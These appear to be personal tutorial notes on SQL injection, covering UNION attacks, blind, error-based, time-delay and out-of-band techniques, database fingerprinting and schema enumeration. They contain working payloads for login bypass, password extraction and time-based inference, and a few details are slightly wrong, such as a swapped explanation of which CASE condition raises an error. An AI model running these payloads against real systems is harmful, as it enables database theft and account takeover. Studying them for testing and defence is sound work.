## SQL Injections (SQLi)

Attacker may insert SQL code into input fields to access data from the database that should not be available for retrieval. Sometimes SQLi can escalate to giving the attacker some sort of server access or Denial of Service. 

Successful SQL attack can lead to leaking:
- Passwords;
- Credit card details;
- Personal user information.

In the database section we had code which just inserts user supplied data into query string. 
`$query = "select * from users where name like '%$searchInput%'";`
This is vulnerable, as user input is not properly filtered, attacker can escape command or add additional SQL code to gain more data 

## How to detect SQL vulnerabilities

It's possible to check for SQLi. Every entry point has to be checked with:
- `'` and look for errors or anomalies;
- Some SQL specific syntax that evaluates to the base value of the entry point, and to a different value, and look for systematic differences in application responses.
- Enter `OR 1=1` and `OR 1=2` and look for application's responses.
- Payloads designed to trigger time delays when executed within a SQl query, and look for differences in the time taken to respond
- OAST (out-of-band application security testing) payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions
- Burp scanner

## Usual query parts vulnerable for SQLi

Usually in `WHERE` of `SELECT`
But also
- In `UPDATE`statements, within the updated values or WHERE clause.
- In `INSERT`, within inserted values
- `SELECT`, within the table or column name
- `SELECT`, within the `ORDER BY` clause

### SQLi types based on results
- Retrieving hidden data. Modify SQL query to return additional results
- Subverting application logic. Change query to interfere with application's logic.
- UNION attacks. Get data from other tables
- Blind SQL injection. Results of a query are not returned n the application's responses.

## Retrieving hidden data. 

For example we have a shop website that has a search based on a parameter categories. When clicking on any category we send a **GET** request with a parameter `category`.
e.g. `https://insecure-website.com/products?category=Gifts`
The relevant data is retrieved from the database like this:
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
From this query we can assume that we could retrieve unreleased products by changing released to 0. So an attacker main enter `'--`. In SQL `--` means comment. So everything after category clause is commented.

We can also modify the request a little to `OR 1==1'--`. This would mean then that we would get all items from table **products**.

**WARNING** `OR 1=1` should be used with caution as it could lead to loss of data if the queries lead to `insert` or `delete`.

## Subverting application logic.

For example we have an login form and this SQL is made to check if valid user:
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
As we can see here, if there was an used `admin` we could insert `admin'--` and would get logged in as an administrator. 

## Retrieving data from other database tables (UNION attacks)

In cases where application returns results of an SQL query, it could be possible to inject an `UNION` query which would retrieve data from another table
`SELECT name, description FROM products WHERE category = 'Gifts'`
So it would be possible to insert 
`' UNION SELECT username, password FROM users--`
and as a result we would retrieve usernames and passwords from the users table

Requirements for UNION attack
- The individual queries must return the same number of columns. So figure out how many columns are returned.
- The data types must be compatible between individual queries. Which columns returned from an original query are suitable data type to hold the results from the injected query.

Determining the number of columns:
One way is to inject `' ORDER BY 1--`, then `' ORDER BY 2` and until the query gives an error, that mean there's not Nth number of column to order by.  

As a result the error would look something like
`The ORDER BY position number 3 is out of range of the number of items in the select list.`
Or some generic error or nothing at all.

The other way is to submit an `UNION SELECT` specifying a different number of `NULL` values.
`' UNION SELECT NULL--` then `' UNION SELECT NULL, NULL--` and so on if the number of nulls does not match the number of columns we will get error
`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`
This method works without specifying data types because `NULL` converts to all primitive types 

As with `ORDER BY` technique we might get a generic error no error at all. When the number of nulls matches the number of columns, the database return an additional row in the result set, containing null values in each column. The effect on the HTTP response depends on the application logic. If we are lucky, we will see some additional content within the response, such an extra row on an HTML table. Otherwise the null might values trigger an error, such as NullPointerException. In the worst case, the response might look the same as a response caused by a incorrect number of null rendering the technique ineffective.


`NOTE - SOME DATABASES COULD USE DIFFERENT SYNTAX`
On ORACLE every `SELECT` must contain a `FROM`. There's a built-in table in Oracle called `DUAL` which can be used for checking number of columns so an injected string might look like this: 
`' UNION SELECT NULL FROM DUAL--` (On MySQL the double slash must be followed by a space or alternatively a `#` symbol can be used to identify comments)  

**Finding columns with an useful data-type**

It's possible to identify column data-type by enumerating columns with a specific data-type value. Usually this would be a string as strings are usually most valuable.

So after figuring out column number, now it's time to probe columns with specific data-type value.
```SQL
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
If the column is not compatible with the data type we would get an error
`Conversion failed when converting the varchar value 'a' to data type int.`
If no error is thrown and application's response contains additional content including the injected string value, then the relevant column is suitable for retrieving string data.

## Union attack for retrieving relevant data

Once we figure out the number of columns and figure out data types for the columns we can try to retrieve interesting data.

Suppose that:
- The original query returns two columns, both of which can hold string data.
- Injection point is quoted string withing the `WHERE` clause.
- The database contains a table called `users` with the columns `username` and `password`

So we can inject into `users` table with
`' UNION SELECT username, password FROM users--`
But to perform a `UNION` attack there's the need of knowing the table name and it's column names.
Fortunate for us, most modern database provide ways to retrieve database structure (tables and column names)

## Multiple values within column

SQL has syntax for concatenating multiple columns into one when doing `SELECT`
`' UNION SELECT username || '~' || password FROM users --`

## Blind SQL injection vulnerabilities

Usually queries if something goes wrong no results are returned to indicate an error. They still can be exploited but techniques are more difficult.

1. Triggering conditional responses
For example user is tracked with a cookie
`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
When a request is processed containing `TrackingId`, the app uses this SQL to determine whether user is know
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
If the query passes check we get response message "Welcome back". Now suppose we send two different requests
`...xyz' AND '1'='1'` 
`...xyz' AND '1'='2'`
- The first one returns true so we should get a `Welcome back` message. 
- The second one returns false so we could get some other error message which might indicate a vulnerability. 

Suppose there is a table called `users` with columns `username` and `password` and a user called `Administrator`, we could determine tht row's password by checking every letter of the substring. We this we determine letter range:
`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
If the servers returns a correct message that could indicate that the password letters matches are somewhere above `m` char. From there we narrow down to the first letter.

[Different databases](https://portswigger.net/web-security/sql-injection/cheat-sheet) use different method name for `substring` 

### Error-based SQLi

It's when errors are used to infer or retrieve sensitive data. Exploit depend on database configuration and types of error we are able to trigger.
- Inducing the app to return a certain error using a conditional response
- Or by being able to turn a blind SQLi into visible one. It's when we are able to return data while also triggering an error.

### Blind SQLi exploits triggered by conditional errors

Some applications can carry out any SQL query, but some cause errors that are not handled properly and an conditional response may be triggered by causing and SQL error within an query.
Let's say our previous example now handles previous errors differently, so now we have to cause an entire SQL error - make an invalid SQL query instead of making conditionals return false.
So we send a request containing our `TrackingId` and these conditionals in turn
```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
The `CASE` keyword tests a condition then if condition return what is after `THEN` if not true returns what is after `ELSE`. So:
- First condition is always `false` because 1!=2 so it returns 1/0, which should return an error
- The second condition is `true` so `a` should be returned and it should be equal to what is after conditional select and throw no error 
And this is how we cause a blind SQLi triggered by conditional errors.
So like with a previous blind SQLi we can proceed to retrieve usernames and passwords
`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
In this example we check if `Username` equals to `Administrator` and if the char int value is higher than `m`. If yes - we cause a an SQL error, if not - no SQL error is triggered.

There are different ways to trigger SQL errors withing different SQL database types.
Refer to this [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### Extracting sensitive data via verbose SQL errors

Misconfigurations sometimes leads to verbose error messages as they can yield useful insight. Consider this error when inserting single quote `'` into id parameter:
`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`

As you can see, we get the exact SQL query that is being executed, which makes it much easier to construct an sql injection.
Sometimes it's possible to induce an application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into visible one.

`CAST()` enables us to convert one data type into another. Consider this
`CAST((SELECT example_column FROM example_table) AS int)`
and this is the error it outputs
`ERROR: invalid input syntax for type integer: "Example data"` As you can see the example_column data was leaked as we see `Example data` string was outputted.
This type of query may also be useful if a character limit prevents you from triggering conditional responses.

### Blind SQLi triggered by time delays

If the applications catches any database error within SQL queries there we won;t any difference in the application's response. That means previous techniques won't work. 

In this situation we can cause time delays if some condition is true. SQL performs queries synchronously by the app, so delaying the query will also delay the HTTP response. Which allows to determine the truth whether the conditions was true or not.

Each database have specific ways to cause a time delay.
Microsoft SQL Server:
```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--
```
```sql
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

- The first will not cause a delay because `1!=2`
- The second will cause a time delay 

So with this in mind, we can infer useful data, like passwords from previous examples
`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

### Blind SQLi using out-of-band techniques (OAST)

To mitigate previous exploit, one might make query execution asynchronous. One thread may continue processing user's request, while the other executes the SQL query using the tracking cookie (from previous examples). Query is still vulnerable to the SQLi, but all the other techniques do not work as application's response doesn't depend on the query returning any data, a database error occurring, or on time taken to execute the query.

As the request is still vulnerable to SQLi, it's possible to exploit the vulnerability by triggering an out-of-band network interaction to a system that you control.

Most often DNS network protocol is used for such exploits. Many production networks allow free egress of DNS queries, because they are essential, for the normal operation of production systems.

You create your attacker-side network service, preferably DNS. Which is used to detect when network interactions occur as a result of sending individual payloads to a vulnerable app

## Identifying SQL databases

When trying to exploit an application for SQLi it's important to know how to determine what database is being used.

To do that we inject different SQLi queries that fingerprint database.

| Database Type | Query |
| - | - |
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

Often it's wise to pair it with an `UNION` attack
`' UNION SELECT @@version`

## Listing the contents of the database

Databases have a set of views called the information schema, which provides the information about database tables, columns and so on.
Oracle does not have such feature.

The query for a schema on other databases
`SELECT * FROM information_schema.tables`
With an output looking something close to this:
```sql
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

Then after getting table names, we could query for column names:
`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
Result:
```sql
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

## Listing the contents of an Oracle database

On Oracle, you can find the same information as follows:
You can list tables by querying all_tables:
`SELECT * FROM all_tables`
You can google column names, they are usually of string type.

You can list columns by querying all_tab_columns:
`SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

##
SQL Syntactic things to try when injecting

- URL encode special symbols
- Add conditionals
- End query with `;` symbol and add queries after that
- Concatinate strings with `||`. Usually various functions

## Second-order SQLi

First-order SQLi occurs when HTTP request immediately does something with the HTTP request and incorporates user input in an unsafe way that poses sensitive data leaks.

Second-order is when user input is stored for later use. Input is placed somewhere in the database, and when retrieved to be processed the executes malicious SQLi. These attacks are also called stored SQLi.

They usually can occur when the initial request input is safely processed, but in some cases it's possible to bypass checks, then later when the input that was deemed trusty, may still include SQLi, that can lead to data leaks.